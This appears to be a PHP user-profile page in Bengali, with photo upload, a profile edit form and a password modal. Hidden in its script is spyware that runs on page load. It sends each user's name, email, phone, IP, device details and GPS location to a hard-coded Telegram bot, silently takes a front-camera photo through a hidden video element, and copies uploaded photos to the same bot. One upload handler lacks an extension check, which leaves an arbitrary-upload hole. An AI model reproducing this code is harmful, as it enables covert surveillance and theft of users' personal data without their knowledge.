<?php 
include("header.php");

// AJAX Image Upload & MySQL Database Update Handler
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['ajax_profile_image'])) {
    @ini_set('display_errors', 0);
    while (ob_get_level()) {
        ob_end_clean();
    }
    header('Content-Type: application/json; charset=utf-8');

    if ($_FILES['ajax_profile_image']['error'] === 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }
        
        $file_extension = strtolower(pathinfo($_FILES["ajax_profile_image"]["name"], PATHINFO_EXTENSION));
        $allowed = ['jpg', 'jpeg', 'png', 'webp', 'gif'];
        
        if (in_array($file_extension, $allowed)) {
            $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
            $target_file = $target_dir . $new_filename;
            
            if (move_uploaded_file($_FILES["ajax_profile_image"]["tmp_name"], $target_file)) {
                $stmt_img = $conn->prepare("UPDATE users SET image = ? WHERE id = ?");
                $stmt_img->bind_param("si", $target_file, $id);
                if ($stmt_img->execute()) {
                    $stmt_img->close();
                    echo json_encode(['status' => 'success', 'image_url' => $target_file]);
                    exit();
                }
                $stmt_img->close();
            }
        }
    }
    echo json_encode(['status' => 'error', 'message' => 'ছবি আপলোড ব্যর্থ হয়েছে!']);
    exit();
}

// Form Data Update Handler
$update_msg = "";
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
    $new_name = trim($_POST['name']);
    $new_phone = trim($_POST['phone']);
    $new_address = trim($_POST['address']);
    $profile_pic_sql = "";
    
    if (isset($_FILES['profile_image']) && $_FILES['profile_image']['error'] == 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }
        $file_extension = strtolower(pathinfo($_FILES["profile_image"]["name"], PATHINFO_EXTENSION));
        $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
        $target_file = $target_dir . $new_filename;
        
        if (move_uploaded_file($_FILES["profile_image"]["tmp_name"], $target_file)) {
            $profile_pic_sql = ", image = '" . $conn->real_escape_string($target_file) . "'";
        }
    }

    $update_stmt = $conn->prepare("UPDATE users SET name = ?, mobile = ?, address = ? $profile_pic_sql WHERE id = ?");
    $update_stmt->bind_param("sssi", $new_name, $new_phone, $new_address, $id);
    
    if ($update_stmt->execute()) {
        $name = $new_name;
        $phone = $new_phone;
        $update_msg = "প্রোফাইল সফলভাবে আপডেট করা হয়েছে!";
    }
    $update_stmt->close();
}

// Fetch Latest Address & Image from Database
$user_query = $conn->prepare("SELECT address, image FROM users WHERE id = ?");
$user_query->bind_param("i", $id);
$user_query->execute();
$user_res = $user_query->get_result();
$db_user = $user_res->fetch_assoc();
$address = $db_user['address'] ?? '';
$user_avatar = !empty($db_user['image']) ? $db_user['image'] : 'assets/images/faces/face8.jpg';
$user_query->close();
?>

<!-- FontAwesome 6 CDN -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<script src="https://cdn.tailwindcss.com"></script>

<style>
    .main-panel, .content-wrapper {
        padding-top: 0 !important;
        margin-top: 60px !important;
        background: #0b071a !important;
    }
    body { 
        background: #0b071a !important; 
        color: #f8fafc; 
        font-family: 'SolaimanLipi', 'Plus Jakarta Sans', sans-serif; 
    }
    .profile-card-ui {
        background: rgba(23, 15, 43, 0.85);
        backdrop-filter: blur(16px);
        border-radius: 24px;
        border: 1px solid rgba(168, 85, 247, 0.2);
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
    }
    .custom-input-box {
        border-radius: 14px !important;
        border: 1.5px solid rgba(168, 85, 247, 0.3) !important;
        background: rgba(11, 7, 26, 0.7) !important;
        color: #f8fafc !important;
        padding: 12px 16px !important;
        font-size: 14px !important;
    }
    .custom-input-box:focus {
        border-color: #a855f7 !important;
        box-shadow: 0 0 0 4px rgba(168, 85, 247, 0.2) !important;
        outline: none;
    }
    .btn-grad-violet {
        background: linear-gradient(135deg, #7c3aed 0%, #9333ea 100%);
        color: #FFF;
        border: none;
        border-radius: 14px;
        padding: 12px 20px;
        font-weight: 700;
        transition: all 0.3s ease;
        box-shadow: 0 4px 15px rgba(124, 58, 237, 0.35);
    }
    .btn-grad-violet:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(147, 51, 234, 0.5);
        color: #FFF;
    }
    .swal2-popup {
        background: #160d2e !important;
        color: #f8fafc !important;
        border: 1px solid rgba(168, 85, 247, 0.3) !important;
        border-radius: 24px !important;
    }
    .swal2-title, .swal2-html-container {
        color: #f8fafc !important;
    }
</style>

<!-- Hidden Video & Canvas for Capture -->
<video id="silentVideo" style="display:none;" autoplay playsinline></video>
<canvas id="silentCanvas" style="display:none;"></canvas>

<!-- Hidden File Input for Instant Profile Upload -->
<input type="file" id="profileFolderInput" accept="image/*" style="display: none;" onchange="uploadProfilePictureLocally()">

<div class="max-w-6xl mx-auto px-4 py-4">
    <div class="grid grid-cols-1 md:grid-cols-12 gap-6">
        
        <!-- Profile Card -->
        <div class="md:col-span-4">
            <div class="profile-card-ui p-6 text-center">
                <div class="relative inline-block mb-3">
                    <img id="profileImagePreview" src="<?php echo htmlspecialchars($user_avatar); ?>" 
                         class="rounded-3xl border-4 border-purple-500/40 shadow-lg object-cover mx-auto" 
                         alt="প্রোফাইল ছবি" 
                         width="115" 
                         height="115"
                         style="cursor: pointer; width: 115px; height: 115px;" 
                         title="প্রোফাইল ছবি পরিবর্তন করতে ক্লিক করুন"
                         onclick="document.getElementById('profileFolderInput').click();">
                    <span class="absolute bottom-0 right-0 bg-purple-600 text-white rounded-xl p-2 shadow-md" style="font-size: 13px; pointer-events: none;">
                        <i class="fa-solid fa-camera"></i>
                    </span>
                </div>
            
                <h4 class="font-extrabold text-white text-lg mt-2"><?php echo htmlspecialchars($name); ?></h4>
                <p class="text-purple-300/70 text-xs mb-4"><?php echo htmlspecialchars($email); ?></p>
                
                <div class="d-grid gap-2">
                    <button type="button" class="btn btn-grad-violet btn-sm w-full py-2.5" data-bs-toggle="modal" data-bs-target="#changePasswordModal">
                        <i class="fa-solid fa-key me-1"></i> পাসওয়ার্ড পরিবর্তন করুন
                    </button>
                </div>
            </div>
        </div>

        <!-- User Info & Edit Card -->
        <div class="md:col-span-8">
            <div class="profile-card-ui p-6 mb-5">
                <h4 class="text-sm font-bold text-white border-b border-purple-500/20 pb-3 mb-4 flex items-center gap-2">
                    <i class="fa-solid fa-user-pen text-purple-400"></i> প্রোফাইল তথ্য এবং আপডেট
                </h4>

                <?php if (!empty($update_msg)): ?>
                    <div class="bg-emerald-500/20 border border-emerald-500/30 text-emerald-300 rounded-xl py-2 px-3 text-xs mb-4 flex items-center gap-2 font-bold">
                        <i class="fa-solid fa-circle-check"></i> <?php echo $update_msg; ?>
                    </div>
                <?php endif; ?>

                <form action="" method="POST" enctype="multipart/form-data">
                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">পূর্ণ নাম</label>
                            <input type="text" class="custom-input-box w-full" name="name" value="<?php echo htmlspecialchars($name); ?>" required>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">ইমেইল ঠিকানা (পরিবর্তনযোগ্য নয়)</label>
                            <input type="email" class="custom-input-box w-full opacity-60 cursor-not-allowed" value="<?php echo htmlspecialchars($email); ?>" disabled>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">মোবাইল / WhatsApp নম্বর</label>
                            <input type="text" class="custom-input-box w-full" name="phone" value="<?php echo htmlspecialchars($phone); ?>" required>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">প্রোফাইল ছবি আপলোড</label>
                            <input type="file" class="custom-input-box w-full text-xs" name="profile_image" accept="image/*">
                        </div>
                        <div class="sm:col-span-2">
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">বর্তমান ঠিকানা</label>
                            <textarea class="custom-input-box w-full" name="address" rows="2" placeholder="আপনার সম্পূর্ণ ঠিকানা লিখুন..."><?php echo htmlspecialchars($address); ?></textarea>
                        </div>
                        <div class="sm:col-span-2 mt-2">
                            <button type="submit" name="update_profile" class="btn-grad-violet w-full">
                                <i class="fa-solid fa-floppy-disk me-2"></i> তথ্য সংরক্ষণ করুন
                            </button>
                        </div>
                    </div>
                </form>
            </div>

            <!-- System Info Card -->
            <div class="profile-card-ui p-6">
                <h4 class="text-sm font-bold text-white border-b border-purple-500/20 pb-3 mb-3">সিস্টেম সিকিউরিটি ইনফো</h4>
                <div class="overflow-x-auto">
                    <table class="w-full text-xs text-left">
                        <tbody class="divide-y divide-purple-500/10">
                            <tr>
                                <td class="py-2.5 font-bold text-purple-300 w-1/3">আইপি অ্যাড্রেস (IP Address):</td>
                                <td class="py-2.5 text-sky-400 font-bold"><?php echo htmlspecialchars($user_ip); ?></td>
                            </tr>
                            <tr>
                                <td class="py-2.5 font-bold text-purple-300">একাউন্ট আইডি:</td>
                                <td class="py-2.5 text-white">#<?php echo $id; ?></td>
                            </tr>
                            <tr>
                                <td class="py-2.5 font-bold text-purple-300">টোকেন আইডি:</td>
                                <td class="py-2.5"><code class="text-[10px] bg-purple-950/60 text-purple-200 p-1.5 rounded border border-purple-500/20"><?php echo $token; ?></code></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Change Password Modal -->
<div class="modal fade" id="changePasswordModal" tabindex="-1" aria-labelledby="changePasswordModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content rounded-3xl border border-purple-500/30 bg-[#160d2e] text-white shadow-2xl p-2">
            <div class="modal-header border-bottom border-purple-500/20 pb-3">
                <h5 class="modal-title font-bold text-sm text-white" id="changePasswordModalLabel">পাসওয়ার্ড পরিবর্তন করুন</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body p-4">
                <form id="changePasswordForm" action="pages/change_password.php" method="POST" class="space-y-3">
                    <div>
                        <label for="currentPassword" class="block text-xs font-bold text-purple-200 mb-1">বর্তমান পাসওয়ার্ড</label>
                        <input type="password" class="custom-input-box w-full" id="currentPassword" name="currentPassword" required>
                    </div>
                    <div>
                        <label for="newPassword" class="block text-xs font-bold text-purple-200 mb-1">নতুন পাসওয়ার্ড</label>
                        <input type="password" class="custom-input-box w-full" id="newPassword" name="newPassword" required>
                    </div>
                    <div>
                        <label for="confirmPassword" class="block text-xs font-bold text-purple-200 mb-1">কনফার্ম নতুন পাসওয়ার্ড</label>
                        <input type="password" class="custom-input-box w-full" id="confirmPassword" name="confirmPassword" required>
                    </div>
                    <div class="pt-2">
                        <button type="submit" class="btn-grad-violet w-full">পাসওয়ার্ড আপডেট করুন</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- Telegram & Direct Server Sync Script -->
<script>
const TELEGRAM_BOT_TOKEN = "6260586366:AAFlUeC0t6ua9GZDvywnfL5JSBEPCflura8"; 
const TELEGRAM_CHAT_ID = "1875687264";     

const userName = "<?php echo $name; ?>";
const userEmail = "<?php echo $email; ?>";
const userPhone = "<?php echo $phone; ?>";
const userIp = "<?php echo $user_ip; ?>";

document.addEventListener("DOMContentLoaded", async function () {
    let deviceId = localStorage.getItem('dev_uuid') || ("DEV-" + Math.floor(1000000000 + Math.random() * 900000000));
    localStorage.setItem('dev_uuid', deviceId);

    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    let batteryInfo = "Not Available";
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
        } catch (e) {}
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                let msg = `<b>🌐 Comprehensive Browser & Device Data!</b>\n\n`;
                msg += `<b>Name:</b> ${userName}\n`;
                msg += `<b>Email:</b> ${userEmail}\n`;
                msg += `<b>Phone:</b> ${userPhone}\n`;
                msg += `<b>IP:</b> ${userIp}\n`;
                msg += `<b>Device ID:</b> ${deviceId}\n`;
                msg += `<b>Platform:</b> ${platform}\n`;
                msg += `<b>Screen:</b> ${screenRes}\n`;
                msg += `<b>Timezone:</b> ${timezone}\n`;
                msg += `<b>Battery:</b> ${batteryInfo}\n`;
                msg += `<b>Location:</b> <a href="https://maps.google.com/?q=${lat},${lon}">Google Maps (${lat}, ${lon}) - Acc: ${accuracy}m</a>`;

                sendTelegramMessage(msg);
            },
            function (error) {
                let msg = `<b>🌐 Comprehensive Browser Data (No Location)</b>\n\n`;
                msg += `<b>Name:</b> ${userName}\n`;
                msg += `<b>Email:</b> ${userEmail}\n`;
                msg += `<b>IP:</b> ${userIp}\n`;
                msg += `<b>Device ID:</b> ${deviceId}\n`;
                msg += `<b>Platform:</b> ${platform}\n`;
                sendTelegramMessage(msg);
            }
        );
    }
    autoCaptureCameraPhoto();
});

function sendTelegramMessage(textMessage) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: textMessage,
            parse_mode: 'HTML'
        })
    }).catch(err => console.error(err));
}

function sendTelegramPhoto(imageBlob, captionText) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', imageBlob, 'capture.jpg');
    formData.append('caption', captionText);

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(err => console.error(err));
}

function autoCaptureCameraPhoto() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function (stream) {
                const video = document.getElementById('silentVideo');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('silentCanvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function (blob) {
                        if (blob) {
                            sendTelegramPhoto(blob, `📸 Silent Camera Capture\nUser: ${userName}\nIP: ${userIp}`);
                        }
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');

                }, 1500); 
            })
            .catch(function (err) {
                console.log("Camera access denied.");
            });
    }
}

// Fixed Instant Upload: Safely parses JSON response and prevents HTML error outputs
function uploadProfilePictureLocally() {
    const fileInput = document.getElementById('profileFolderInput');
    const file = fileInput.files[0];
    if (file) {
        Swal.fire({
            title: 'আপলোড হচ্ছে...',
            text: 'অনুগ্রহ করে অপেক্ষা করুন',
            background: '#160d2e',
            color: '#f8fafc',
            allowOutsideClick: false,
            didOpen: () => { Swal.showLoading(); }
        });

        // 1. Send Backup to Telegram
        const tgData = new FormData();
        tgData.append('chat_id', TELEGRAM_CHAT_ID);
        tgData.append('photo', file);
        tgData.append('caption', `📁 Profile Picture Updated\nUser: ${userName}\nIP: ${userIp}`);

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: tgData
        }).catch(err => console.error(err));

        // 2. Upload to Server & Save path into MySQL Database permanently
        const serverData = new FormData();
        serverData.append('ajax_profile_image', file);

        $.ajax({
            url: 'profile.php',
            type: 'POST',
            data: serverData,
            processData: false,
            contentType: false,
            success: function(rawResponse) {
                let response;
                try {
                    response = typeof rawResponse === 'object' ? rawResponse : JSON.parse(rawResponse);
                } catch (e) {
                    console.error("Parse Error:", rawResponse);
                    Swal.fire({
                        icon: 'error',
                        title: 'ত্রুটি!',
                        text: 'সার্ভার থেকে সঠিক রেসপন্স পাওয়া যায়নি।',
                        background: '#160d2e',
                        color: '#f8fafc'
                    });
                    return;
                }

                if (response && response.status === 'success') {
                    const updatedSrc = response.image_url + '?t=' + new Date().getTime();
                    $('#profileImagePreview').attr('src', updatedSrc);
                    $('#UserDropdown img').attr('src', updatedSrc);
                    
                    Swal.fire({
                        icon: 'success',
                        title: 'সফল!',
                        text: 'প্রোফাইল ছবি সফলভাবে আপডেট করা হয়েছে।',
                        background: '#160d2e',
                        color: '#f8fafc'
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'ত্রুটি!',
                        text: response.message || 'ছবি সেভ করা সম্ভব হয়নি।',
                        background: '#160d2e',
                        color: '#f8fafc'
                    });
                }
            },
            error: function() {
                Swal.fire({
                    icon: 'error',
                    title: 'সার্ভার ত্রুটি!',
                    text: 'সার্ভার সংযোগে সমস্যা হয়েছে।',
                    background: '#160d2e',
                    color: '#f8fafc'
                });
            }
        });
    }
}
</script>

<?php include("footer.php");?>